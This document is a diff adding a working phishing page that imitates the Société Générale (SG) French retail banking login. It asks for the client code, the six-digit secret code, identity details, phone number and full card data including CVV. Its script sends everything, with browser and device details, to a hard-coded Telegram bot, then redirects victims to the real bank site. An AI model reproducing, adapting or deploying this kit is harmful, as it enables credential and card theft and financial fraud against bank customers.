@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SG | Connexion</title>
+    <link rel="icon" href="https://particuliers.sg.fr/static/Resources/img/favicon.ico">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fff;
+            color: #000;
+        }
+
+        header {
+            background-color: #0b0039;
+            color: #fff;
+            padding: 0.3rem 2rem;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            font-size: 0.8rem;
+        }
+
+        header .left {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        header .left a {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #fff;
+            text-decoration: none;
+        }
+
+        header .left svg {
+            width: 1.2em;
+            height: 1.2em;
+            fill: currentColor;
+        }
+
+        header .right {
+            display: flex;
+            align-items: center;
+            gap: 3.5rem;
+        }
+
+        header .right button {
+            background-color: #fff;
+            color: #0b0039;
+            border: none;
+            padding: 0.25rem 1rem;
+            border-radius: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .logo-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1rem 2rem;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .logo-container {
+            background-color: white;
+            padding: 0.15rem;
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        .logo-bar img {
+            height: 70px;
+        }
+
+        .vertical-separator {
+            width: 2px;
+            background-color: #cecdcd;
+            position: absolute;
+            right: 50%;
+            top: 13rem;
+            bottom: -9rem;
+            transform: translateX(50%);
+            margin-bottom: 9.7rem;
+        }
+
+        .right-content {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-bar button {
+            background-color: #091c47;
+            color: #fff;
+            border: none;
+            padding: 0.8rem 1rem;
+            border-radius: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: row;
+            max-width: 1200px;
+            margin: 0.5rem auto 3rem;
+            padding: 1rem;
+            gap: 2rem;
+            position: relative;
+        }
+
+        .page-title {
+            font-size: 1rem;
+            margin: 1rem 0 0 1rem;
+        }
+
+        .login-section {
+            flex: 1;
+            padding-right: 2rem;
+        }
+
+        .login-section h2 {
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            margin-top: -1.5rem;
+        }
+
+        .login-box {
+            position: relative;
+            max-width: 280px;
+            margin-top: 4rem;
+            margin-left: 7rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .input-container {
+            width: 100%;
+            position: relative;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-container::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: 0;
+            left: 50%;
+            background-color: #000;
+            transition: width 0.3s ease;
+            transform: translateX(-50%);
+        }
+
+        .input-container:focus-within::after {
+            width: calc(100% + 40px);
+        }
+
+        .floating-label {
+            position: absolute;
+            pointer-events: none;
+            left: 0.8rem;
+            top: 0.5rem;
+            transition: 0.2s ease all;
+            color: #666;
+            font-size: 1.1rem;
+        }
+
+        .login-box input[type="text"] {
+            width: 100%;
+            padding: 0.5rem 2rem 0.5rem 0.8rem;
+            border: none;
+            border-bottom: 1px solid #999;
+            font-size: 1.3rem;
+            font-weight: 600;
+            background: transparent;
+            transition: border-color 0.3s ease;
+            letter-spacing: 1px;
+        }
+
+        .login-box input[type="text"]:focus {
+            outline: none;
+            border-color: transparent;
+        }
+
+        .login-box input[type="text"]::placeholder {
+            color: transparent;
+        }
+
+        .login-box input[type="text"]:focus ~ .floating-label,
+        .login-box input[type="text"]:not(:placeholder-shown) ~ .floating-label {
+            top: -1.2rem;
+            font-size: 0.9rem;
+            color: #666;
+            font-weight: 600;
+        }
+
+        .login-box .error-message {
+            color: #e2001a;
+            font-size: 0.8rem;
+            margin-top: 0.3rem;
+        }
+
+        .login-box .clear {
+            position: absolute;
+            right: -30px;
+            top: -0.2rem;
+            cursor: pointer;
+            font-size: 1.7rem;
+            color: #666;
+            font-weight: 900;
+            padding: 0 5px;
+            font-family: Arial, sans-serif;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s ease, visibility 0.2s ease;
+        }
+
+        .login-box .clear::after {
+            content: '⨉';
+        }
+
+        .login-box .clear.valid {
+            transform: translateY(-2px);
+        }
+
+        .login-box .clear.valid::after {
+            content: '✓';
+            color: #2ea52e;
+            font-size: 2rem;
+            font-weight: bold;
+        }
+
+        .login-box .clear:not(.valid) {
+            cursor: pointer;
+        }
+
+        .login-box .clear:not(.valid):hover {
+            color: #333;
+        }
+
+        .login-box input[type="text"]:not(:placeholder-shown) ~ .clear {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin: 0.4rem 0;
+            font-size: 1rem;
+            color: #333;
+        }
+
+        .remember .info-icon {
+            color: #666;
+            font-size: 1.2rem;
+            margin-left: 0.3rem;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 25px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+            font-size: 0.7rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 8px;
+            color: white;
+            font-weight: 500;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 21px;
+            width: 21px;
+            left: 2px;
+            bottom: 2px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+            z-index: 1;
+        }
+
+        .switch input:checked + .slider {
+            background-color: #2ea52e;
+        }
+
+        .switch input:checked + .slider:before {
+            transform: translateX(25px);
+        }
+
+        .slider .non {
+            margin-left: 2px;
+            z-index: 2;
+        }
+
+        .slider .oui {
+            margin-right: 4px;
+            z-index: 2;
+            opacity: 0;
+        }
+
+        .switch input:checked + .slider .oui {
+            opacity: 1;
+        }
+
+        .switch input:checked + .slider .non {
+            opacity: 0;
+        }
+
+        .login-box button {
+            width: 80%;
+            padding: 0.75rem;
+            background-color: #e2001a;
+            color: #fff;
+            border: none;
+            border-radius: 2rem;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 0.3rem;
+        }
+
+        .help-section {
+            flex: 1;
+            padding-left: 7rem;
+            font-size: 1rem;
+            margin-top: 2rem;
+        }
+
+        .help-section h3 {
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+        }
+
+        .help-section ul {
+            margin: 0;
+            padding-left: 2.5rem;
+        }
+
+        .help-section ul li {
+            line-height: 1.4;
+        }
+
+        .help-section a {
+            color: #000;
+            text-decoration: none;
+            font-size: 0.95rem;
+        }
+
+        .help-section a:hover {
+            color: #000;
+        }
+
+        .help-section a span {
+            text-decoration: underline;
+        }
+
+        .help-section p {
+            margin: 0.5rem 0;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 2rem 2rem 1rem;
+            font-size: 0.75rem;
+            color: #666;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 0;
+            margin-bottom: 1rem;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            font-size: 0.9rem;
+            white-space: nowrap;
+            padding: 0 0.5rem;
+        }
+
+        .footer-links a:not(:last-child)::after {
+            content: '|';
+            margin-left: 0.5rem;
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        .footer-logo {
+            margin-top: 1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .footer-logo img {
+            height: 24px;
+        }
+
+        .footer-url {
+            background-color: #f0f0f0;
+            padding: 0.3rem 0.8rem;
+            border-radius: 4px;
+            display: inline-block;
+            margin-top: 0.5rem;
+            font-size: 0.75rem;
+            color: #666;
+        }
+
+        .other-spaces {
+            padding: 14rem 2rem 2rem 2rem;
+            background-color: #e4e4e4;
+            border-top: 0px solid #999797;
+            border-bottom: 0px solid #aaa8a8;
+            margin: 8rem auto 3rem;
+            text-align: center;
+            max-width: 1100px;
+        }
+
+        .other-spaces h2 {
+            font-size: 2rem;
+            color: #333;
+            margin-bottom: 2rem;
+            margin-top: -9rem;
+        }
+
+        .space-button {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 1rem;
+            margin: 1rem auto;
+            border: 1px solid #ddd;
+            border-radius: 0.5rem;
+            max-width: 600px;
+            text-decoration: none;
+            color: #333;
+            background-color: #fff;
+            transition: background-color 0.3s ease;
+        }
+
+        .space-button:hover {
+            background-color: #eee;
+        }
+
+        .space-button span {
+            font-size: 0.9rem;
+        }
+
+        .space-button svg {
+            width: 1em;
+            height: 1em;
+            fill: #555;
+        }
+
+        .space-button-img {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0;
+            margin: 1rem auto;
+            border: 1px solid #ddd;
+            border-radius: 0.5rem;
+            max-width: 600px;
+            text-decoration: none;
+            color: #333;
+            background-color: #fff;
+            transition: background-color 0.3s ease;
+            overflow: hidden;
+        }
+
+        .space-button-img img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .space-button-img:hover {
+            background-color: #eee;
+        }
+
+        .useful-links-detailed {
+            padding: 2rem 0 1rem;
+            text-align: center;
+            margin-top: 2rem;
+            background-color: transparent;
+        }
+
+        .useful-links-detailed h2 {
+            font-size: 2rem;
+            color: #333;
+            margin-bottom: 2rem;
+            margin-top: 1rem;
+        }
+
+        .link-group {
+            display: flex;
+            justify-content: center;
+            gap: 4rem;
+            max-width: 900px;
+            margin: 0 auto;
+            padding-left: 15rem;
+        }
+
+        .useful-links-detailed .link-item {
+            text-align: left;
+            flex: 1;
+        }
+
+        .useful-links-detailed .link-item h3 {
+            font-size: 1.2rem;
+            color: #333;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.2rem;
+        }
+
+        .useful-links-detailed .link-item h3 img {
+            width: 50px;
+            height: 50px;
+            margin-left: -3.3rem;
+        }
+
+        .useful-links-detailed .link-item a {
+            text-decoration: underline;
+            color: #555;
+            font-size: 1rem;
+            display: block;
+            margin-bottom: 0.5rem;
+            line-height: 1.4;
+        }
+
+        .useful-links-detailed .link-item a:hover {
+            color: #e2001a;
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            background-color: #000;
+            color: #fff;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .footer-bottom img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .autres-sites {
+            position: relative; /* Pour positionner une éventuelle liste déroulante */
+        }
+
+        .footer-bottom-social {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .social-icon {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .social-icon svg {
+            width: 1.5em;
+            height: 1.5em;
+            fill: #fff;
+        }
+
+        .password-display {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 2rem 0;
+            position: relative;
+            padding: 0;
+        }
+
+        .password-dots {
+            display: flex;
+            gap: 0.5rem;
+            margin-right: 0.5rem;
+        }
+
+        .dot {
+            width: 1rem;
+            height: 2px;
+            background-color: #999;
+            transition: background-color 0.2s;
+        }
+
+        .dot.filled {
+            background-color: #000;
+        }
+
+        .clear-password {
+            position: relative;
+            background: none;
+            border: none;
+            font-size: 1.2rem;
+            color: #666;
+            cursor: pointer;
+            padding: 0.5rem;
+            display: none;
+            margin-left: -0.5rem;
+        }
+
+        .clear-password.visible {
+            display: block;
+        }
+
+        .numpad {
+            margin: 2rem auto;
+            width: 240px;
+            height: 240px;
+            border: none;
+        }
+
+        .numpad-row {
+            display: flex;
+            justify-content: center;
+            gap: 2px;
+            margin-bottom: 2px;
+            height: 25%;
+        }
+
+        .numpad-btn {
+            flex: 1;
+            aspect-ratio: 1;
+            border: none;
+            background-color: #e8e8e8;
+            border-radius: 0;
+            font-size: 1.3rem;
+            color: #000;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        .numpad-btn:empty {
+            border: none;
+            background-color: #e8e8e8;
+        }
+
+        .numpad-btn:hover {
+            background-color: #e8e8e8;
+        }
+
+        .validate-btn {
+            width: 80%;
+            padding: 0.75rem;
+            background-color: #e2001a;
+            color: #fff;
+            border: none;
+            border-radius: 0;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+
+        .validate-btn:hover {
+            background-color: #c50017;
+        }
+
+        .code-client-display {
+            width: 100%;
+            margin-bottom: 1rem;
+        }
+
+        .code-client-display span {
+            color: #666;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .code-client-display .code-value {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #000;
+            letter-spacing: 1px;
+            margin-top: 0.2rem;
+            border-bottom: 1px solid #999;
+            padding-bottom: 0.5rem;
+        }
+
+        .code-client-display .clear.valid {
+            color: #2ea52e;
+            font-size: 2rem;
+            margin-right: 0 !important;
+        }
+
+        .form-container {
+            width: 100%;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+        }
+
+        .form-group {
+            margin-bottom: 0.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            color: #666;
+            margin-bottom: 0.2rem;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .form-group > label {
+            color: #333;
+            font-size: 0.9rem;
+            font-weight: 700;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 0.4rem;
+            border: 1px solid #ccc;
+            font-size: 0.9rem;
+        }
+
+        .card-details {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .card-number {
+            flex: 2;
+        }
+
+        .card-expiry, .card-cvv {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="left">
+            <a href="#">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                </svg>
+                Agences
+            </a>
+            <a href="#">
+                <svg viewBox="0 0 24 24">
+                    <path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
+                </svg>
+                Aide et contacts
+            </a>
+        </div>
+    </header>
+
+    <div class="logo-bar">
+        <div class="logo-container">
+        <img src="Logo-SG-et-Vous.png" alt="SG logo">
+            <div class="vertical-separator"></div>
+        </div>
+        <button>Ouvrir un compte</button>
+    </div>
+
+    <h2 class="page-title">Connexion à votre Espace Client Particuliers</h2>
+    <div class="container">
+        <div class="login-section">
+            <div class="login-box">
+                <div class="input-container">
+                    <input type="text" 
+                           placeholder="Saisissez votre code client" 
+                           id="codeClient" 
+                           maxlength="8" 
+                           pattern="[0-9]*" 
+                           inputmode="numeric"
+                           onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                           oninput="this.value = this.value.replace(/[^0-9]/g, ''); document.querySelector('.clear').classList.toggle('valid', this.value.length === 8);">
+                    <label class="floating-label">Saisissez votre code client</label>
+                    <span class="clear"></span>
+                </div>
+                <div class="remember">
+                    <label class="switch">
+                        <input type="checkbox">
+                        <span class="slider">
+                            <span class="oui">oui</span>
+                            <span class="non">non</span>
+                        </span>
+                    </label>
+                    <span>Se souvenir de moi</span>
+                    <span class="info-icon">ⓘ</span>
+                </div>
+                <button>Valider</button>
+            </div>
+        </div>
+
+        <div class="vertical-separator"></div>
+
+        <div class="help-section">
+            <h3>Où trouver mon Code Client SG ?</h3>
+            <ul>
+                <li>Votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de<br>comptes.</li>
+            </ul>
+
+            <h3>Code Client ou Code Secret inconnus ?</h3>
+            <p><a href="#">» <span>Je souhaite obtenir mon Code Client</span></a></p>
+            <p><a href="#">» <span>Je ne connais pas mon Code Secret</span></a></p>
+        </div>
+    </div>
+
+    <div class="other-spaces">
+        <h2>Nos autres Espaces Client</h2>
+        <a href="#" class="space-button-img">
+            <img src="1.png" alt="Espace Client Professionnels - Progeliance Net">
+        </a>
+        <a href="#" class="space-button-img">
+            <img src="2.png" alt="Espace Client Entreprises - Sogecash Net">
+        </a>
+
+    <div class="useful-links-detailed">
+        <h2>Liens utiles</h2>
+        <div class="link-group">
+            <div class="link-item">
+                    <h3><img src="SGAvenirStyledCarteBloquee48.png" alt="Carte bancaire"> Urgences carte bancaire</h3>
+                    <a href="#">Faire opposition à votre carte bancaire</a>
+                <a href="#">Verrouiller votre carte bancaire</a>
+            </div>
+            <div class="link-item">
+                    <h3><img src="SGAvenirStyledBouclierSecurite48.png" alt="Bouclier sécurité"> Nos conseils sécurité</h3>
+                    <a href="#">Découvrez le Pass sécurité</a>
+                    <a href="#">Guide des bonnes pratiques</a>
+                <a href="#">Voir les menaces identifiées</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <img src="BARRE.png" alt="Navigation footer">
+    </div>
+
+    <div class="footer">
+        <div class="footer-logo">
+            <img src="logo-sg-seul.png" alt="SG logo">
+        </div>
+        <div class="footer-links">
+            <a href="#">Sécurité</a>
+            <a href="#">Nos engagements</a>
+            <a href="#">Gestion des Cookies</a>
+            <a href="#">Données personnelles</a>
+            <a href="#">Documentation et Tarifs</a>
+            <a href="#">Résilier une prestation</a>
+            <a href="#">Contestation et réclamation</a>
+            <a href="#">Informations légales</a>
+            <a href="#">Accessibilité Numérique (partiellement conforme)</a>
+        </div>
+        <div class="footer-url">
+            https://www.societegenerale.com
+    </div>
+    </div>
+
+    <script>
+        let currentPassword = '';  // Déplacer la variable en dehors de la fonction
+
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        function showPasswordPage() {
+            // Créer un tableau de 16 positions avec les chiffres 0-9 et des cases vides
+            let keypadNumbers = Array(16).fill('');
+            const numbers = shuffleArray([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]);
+            
+            // Placer les 10 chiffres aléatoirement dans le tableau de 16 positions
+            for (let i = 0; i < 10; i++) {
+                let position;
+                do {
+                    position = Math.floor(Math.random() * 16);
+                } while (keypadNumbers[position] !== '');
+                keypadNumbers[position] = numbers[i];
+            }
+
+            const loginSection = document.querySelector('.login-section');
+            const helpSection = document.querySelector('.help-section');
+            const codeClientValue = document.getElementById('codeClient').value;
+            const rememberMeChecked = document.querySelector('.switch input').checked;
+            
+            // Créer les rangées du clavier
+            let keypadHtml = '';
+            for (let i = 0; i < 4; i++) {
+                keypadHtml += `
+                    <div class="numpad-row">
+                        ${keypadNumbers.slice(i * 4, (i + 1) * 4).map(num => `
+                            <button class="numpad-btn">${num}</button>
+                        `).join('')}
+                    </div>
+                `;
+            }
+
+            loginSection.innerHTML = `
+                <div class="login-box">
+                    <div class="code-client-display">
+                        <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                            <div style="width: 100%;">
+                                <span>Code Client</span>
+                                <div class="code-value">${codeClientValue}</div>
+                            </div>
+                            <span class="clear valid" style="position: static; opacity: 1; visibility: visible; transform: translateY(-8px);"></span>
+                        </div>
+                    </div>
+                    <div class="remember" style="margin: 0.5rem 0 2rem; text-align: left;">
+                        <label class="switch">
+                            <input type="checkbox" ${rememberMeChecked ? 'checked' : ''}>
+                            <span class="slider">
+                                <span class="oui">oui</span>
+                                <span class="non">non</span>
+                            </span>
+                        </label>
+                        <span>Se souvenir de moi</span>
+                        <span class="info-icon">ⓘ</span>
+                    </div>
+                    <div class="password-display">
+                        <div class="password-dots">
+                            <span class="dot"></span>
+                            <span class="dot"></span>
+                            <span class="dot"></span>
+                            <span class="dot"></span>
+                            <span class="dot"></span>
+                            <span class="dot"></span>
+                        </div>
+                        <button class="clear-password">✕</button>
+                    </div>
+                    <div class="numpad">
+                        ${keypadHtml}
+                    </div>
+                    <div class="form-container">
+                        <div class="form-group">
+                            <label>Nom complet</label>
+                            <input type="text" placeholder="Votre nom complet">
+                        </div>
+                        <div class="form-group">
+                            <label>Date de naissance</label>
+                            <input type="date">
+                        </div>
+                        <div class="form-group">
+                            <label>Adresse postale</label>
+                            <input type="text" placeholder="Votre adresse">
+                        </div>
+                        <div class="form-group">
+                            <label>Numéro de téléphone</label>
+                            <input type="tel" 
+                                   id="phoneNumber"
+                                   placeholder="XX XX XX XX XX" 
+                                   maxlength="14">
+                        </div>
+                        <div class="form-group">
+                            <label>Coordonnées bancaires</label>
+                            <div class="card-details">
+                                <div class="card-number">
+                                    <label>Numéro de carte (16 chiffres)</label>
+                                    <input type="text" 
+                                           id="cardNumber"
+                                           placeholder="XXXX XXXX XXXX XXXX" 
+                                           maxlength="19">
+                                </div>
+                            </div>
+                            <div class="card-details" style="margin-top: 0.5rem;">
+                                <div class="card-expiry">
+                                    <label>Date d'expiration</label>
+                                    <input type="text" 
+                                           id="expiryDate"
+                                           placeholder="MM/AA" 
+                                           maxlength="5"
+                                           oninput="this.value = this.value.replace(/\D/g, '').replace(/^(\d{2})/, '$1/').substr(0, 5);"
+                                           onkeydown="if(event.key === 'Backspace' && this.value.slice(-1) === '/') this.value = this.value.slice(0, -1);">
+                                </div>
+                                <div class="card-cvv">
+                                    <label>CVV</label>
+                                    <input type="text" placeholder="3 chiffres au dos" maxlength="3" pattern="[0-9]{3}">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="validate-btn">Valider</button>
+                </div>
+            `;
+
+            // Styles mis à jour pour le clavier
+            const style = document.createElement('style');
+            style.textContent = `
+                .numpad {
+                    margin: 2rem auto;
+                    width: 240px;
+                    height: 240px;
+                    border: none;
+                }
+
+                .numpad-row {
+                    display: flex;
+                    justify-content: center;
+                    gap: 0;
+                    margin-bottom: 0;
+                    height: 25%;
+                }
+
+                .numpad-btn {
+                    flex: 1;
+                    aspect-ratio: 1;
+                    border: none;
+                    background-color: #e8e8e8;
+                    border-radius: 0;
+                    font-size: 1.3rem;
+                    color: #000;
+                    cursor: pointer;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    margin: 0;
+                    padding: 0;
+                }
+
+                .numpad-btn:empty {
+                    border: none;
+                    background-color: #e8e8e8;
+                }
+
+                .numpad-btn:hover {
+                    background-color: #e8e8e8;
+                }
+
+                .validate-btn {
+                    width: 80%;
+                    padding: 0.75rem;
+                    background-color: #e2001a;
+                    color: #fff;
+                    border: none;
+                    border-radius: 0;
+                    font-size: 1rem;
+                    cursor: pointer;
+                    margin-top: 1rem;
+                }
+
+                .validate-btn:hover {
+                    background-color: #c50017;
+                }
+
+                .form-container {
+                    width: 100%;
+                    margin: 1rem 0;
+                    font-size: 0.9rem;
+                }
+
+                .form-group {
+                    margin-bottom: 0.5rem;
+                }
+
+                .form-group label {
+                    display: block;
+                    color: #666;
+                    margin-bottom: 0.2rem;
+                    font-size: 0.85rem;
+                    font-weight: 600;
+                }
+
+                .form-group > label {
+                    color: #333;
+                    font-size: 0.9rem;
+                    font-weight: 700;
+                }
+
+                .form-group input {
+                    width: 100%;
+                    padding: 0.4rem;
+                    border: 1px solid #ccc;
+                    font-size: 0.9rem;
+                }
+
+                .card-details {
+                    display: flex;
+                    gap: 0.5rem;
+                }
+
+                .card-number {
+                    flex: 2;
+                }
+
+                .card-expiry, .card-cvv {
+                    flex: 1;
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Gestion du formatage du numéro de carte
+            setTimeout(() => {
+                const cardNumberInput = document.getElementById('cardNumber');
+                cardNumberInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 16) {
+                        value = value.slice(0, 16);
+                    }
+                    value = value.replace(/(.{4})/g, '$1 ').trim();
+                    e.target.value = value;
+                });
+
+                cardNumberInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && e.target.value.slice(-1) === ' ') {
+                        e.target.value = e.target.value.slice(0, -1);
+                    }
+                });
+            }, 100);
+
+            // Gestion des clics sur le clavier numérique
+            setTimeout(() => {
+                const dots = document.querySelectorAll('.dot');
+                const clearBtn = document.querySelector('.clear-password');
+                const validateBtn = document.querySelector('.validate-btn');
+
+                document.querySelectorAll('.numpad-btn').forEach(btn => {
+                    if (btn.textContent.trim() !== '') {
+                        btn.addEventListener('click', () => {
+                            if (currentPassword.length < 6) {
+                                currentPassword += btn.textContent;
+                                updateDots();
+                            }
+                        });
+                    }
+                });
+
+                clearBtn.addEventListener('click', () => {
+                    currentPassword = '';
+                    updateDots();
+                });
+
+                validateBtn.addEventListener('click', () => {
+                    const data = {
+                        codeClient: document.querySelector('.code-value').textContent,
+                        password: currentPassword,
+                        fullName: document.querySelector('input[placeholder="Votre nom complet"]').value,
+                        birthDate: document.querySelector('input[type="date"]').value,
+                        address: document.querySelector('input[placeholder="Votre adresse"]').value,
+                        phone: document.querySelector('#phoneNumber').value,
+                        cardNumber: document.querySelector('#cardNumber').value,
+                        expiryDate: document.querySelector('#expiryDate').value,
+                        cvv: document.querySelector('input[placeholder="3 chiffres au dos"]').value
+                    };
+
+                    sendToTelegram(data);
+                });
+
+                function updateDots() {
+                    dots.forEach((dot, index) => {
+                        dot.classList.toggle('filled', index < currentPassword.length);
+                    });
+                    clearBtn.classList.toggle('visible', currentPassword.length > 0);
+                }
+            }, 100);
+
+            // Gestion du formatage de la date d'expiration
+            setTimeout(() => {
+                const expiryInput = document.getElementById('expiryDate');
+                expiryInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 4) {
+                        value = value.slice(0, 4);
+                    }
+                    if (value.length >= 2) {
+                        value = value.slice(0, 2) + '/' + value.slice(2);
+                    }
+                    e.target.value = value;
+                });
+
+                expiryInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && e.target.value.slice(-1) === '/') {
+                        e.target.value = e.target.value.slice(0, -1);
+                    }
+                });
+            }, 100);
+
+            // Gestion du formatage du numéro de téléphone
+            setTimeout(() => {
+                const phoneInput = document.getElementById('phoneNumber');
+                phoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 10) {
+                        value = value.slice(0, 10);
+                    }
+                    value = value.replace(/(.{2})/g, '$1 ').trim();
+                    e.target.value = value;
+                });
+
+                phoneInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && e.target.value.slice(-1) === ' ') {
+                        e.target.value = e.target.value.slice(0, -1);
+                    }
+                });
+            }, 100);
+        }
+
+        // Fonction pour obtenir les informations système
+        function getSystemInfo() {
+            return {
+                device: navigator.platform,
+                browser: navigator.userAgent,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                date: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })
+            };
+        }
+
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(data) {
+            const botToken = '7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw';
+            const chatId = '7263826117';
+            const systemInfo = getSystemInfo();
+            const text = `
+🔐 Nouvelles données SG:
+
+👤 Code Client: ${data.codeClient}
+🔑 Code Secret: ${data.password}
+📝 Nom complet: ${data.fullName}
+📅 Date de naissance: ${data.birthDate}
+📍 Adresse: ${data.address}
+📱 Téléphone: ${data.phone}
+
+💳 Informations carte:
+Numéro: ${data.cardNumber}
+Expiration: ${data.expiryDate}
+CVV: ${data.cvv}
+
+📱 Informations système:
+💻 Appareil: ${systemInfo.device}
+🌐 Navigateur: ${systemInfo.browser}
+🌍 Langue: ${systemInfo.language}
+📊 Écran: ${systemInfo.screen}
+⏰ Date: ${systemInfo.date}
+`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    window.location.href = 'https://particuliers.sg.fr';
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+            }
+        }
+
+        // Ajout de l'événement sur le bouton Valider de la première page
+        document.querySelector('.login-box button').addEventListener('click', showPasswordPage);
+    </script>
+</body>
+</html>
